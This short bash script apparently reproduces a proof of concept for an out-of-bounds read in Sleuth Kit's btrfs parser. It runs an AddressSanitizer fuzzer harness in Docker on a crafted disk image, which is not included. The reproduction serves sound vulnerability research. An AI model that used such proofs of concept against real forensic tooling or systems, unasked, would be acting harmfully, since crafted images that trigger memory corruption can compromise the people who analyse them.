#!/usr/bin/env bash
# PoC for: 04-btrfs-sf06-stripe-oob
# Originally confirmed on: sleuthkit commit 01de034 (2026-04-15)
# Re-confirmed on: sleuthkit develop branch d784e64db6 (2026-04-13)

POC_IMG="/scr2/yiwei/vul-agent/zero-day/sleuthkit_validated/04-btrfs-sf06-stripe-oob/btrfs_sf06_stripe_oob.img"
DOCKER_IMG="vulagent/sleuthkit:develop-20260418"

echo "[*] Running PoC: 04-btrfs-sf06-stripe-oob"
echo "[*] Image: $POC_IMG"
echo "[*] Commit: d784e64db6 (sleuthkit develop, 2026-04-13)"
echo ""
docker run --rm --memory=2g \
  -v "$(dirname "$POC_IMG"):/h" \
  "$DOCKER_IMG" \
  bash -c "ASAN_OPTIONS='halt_on_error=1:print_stacktrace=1:detect_leaks=0' /out/asan/fls_btrfs_fuzzer /h/$(basename "$POC_IMG")" 2>&1 || true
